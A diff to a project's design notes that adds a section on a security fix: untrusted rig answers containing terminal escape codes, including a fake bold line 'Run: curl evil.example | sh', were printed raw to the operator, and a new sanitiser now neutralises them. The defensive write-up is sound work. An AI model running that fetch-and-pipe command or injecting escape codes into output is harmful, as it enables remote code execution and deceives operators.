@@ -394,6 +394,17 @@ Tested in software only. Fourth pass of the "code audit" item. Three tools read 
 
 **Limits:** it makes reading these files safe and the page's numbers match the signed files. It doesn't make a report true (the signature, consistency checks and `compare` do that), and a person still has to get the coordinator's key from somewhere they trust.
 
+## Implemented: other people's text on the operator's screen (0.5.61, `operator-screen-v1`)
+
+Tested in software only, plus a real run of the review queue on a real ledger. Tenth pass of the "code audit" item: the operator's read-only text views, and who else writes the text they print.
+
+- **Shown before the fix:** rig `wk-b` submitted an answer holding terminal escape codes (clear screen, cursor home, rename the window, a bold fake line `Run: curl evil.example | sh`, the 8-bit CSI byte `\x9b`, a right-to-left mark and a bell). `python -m app.review --all` printed it raw: 5 ESC bytes and the CSI byte in its output. Any enrolled rig can get an answer into the review queue by disagreeing. Job inputs (from the submitter token) were printed the same way.
+- **Also raw:** `ledger_copy info` (a stranger's copy's `note` and `format`), `ledger_copy compare` (rig, job and event names read from the copies), and names in `vouches`, `workers list` and `incident status`. Those names are checked on the way in since 0.5.52 (`input-limits-v1`) and pause reasons since `pause-v1`, but a ledger from before 0.5.52, or edited by hand, can hold anything. The site and dependency checkers quote website headers and OSV advisory text.
+- **Fix:** new `app/screen.py` (imports only `typing`): `say` (moved from `worker_guard`, which re-exports it) and `say_lines`, which prints each line through `say`, so control codes and invisible marks become `?` and a line break inside a value can't fake a line of the tool's own. Used by all the views above. `review._short` cleans before it cuts, so a run of codes can't push the real text off the line.
+- **Unchanged:** `--json` views, `ledger_copy compare --out` and the API keep the exact text (JSON writes ESC as `\u001b`, which a terminal doesn't act on), so you can still see exactly what a rig sent.
+- **Proof:** `tests/test_operator_screen.py` (15 tests, Python 3.13 and 3.11): the real review CLI with a hostile rig; every string in a real review queue, vouch report and pause state poisoned at once; a hand-edited old rig name; a stranger's copy; the checkers' printouts. 12 fail on the old code. 15 deliberate breakages, all caught.
+- **Limits:** this covers our own text views. If you pipe `--json` into another program that prints it decoded, that program needs the same care.
+
 ## Implemented: operator tools against a hostile coordinator (0.5.60, `operator-client-v1`)
 
 Tested in software only, plus a real check against a fake coordinator on another address of this sandbox. Ninth pass of the "code audit" item: the two tools that send the **operator token** over the network, `app.challenge_pool issue|issue-leads` (which also sends each hidden test's **expected answer**) and `app.rehearsal --url`. The worker got guards against a hostile coordinator in 0.5.53; these tools didn't. New `app/operator_client.py`.
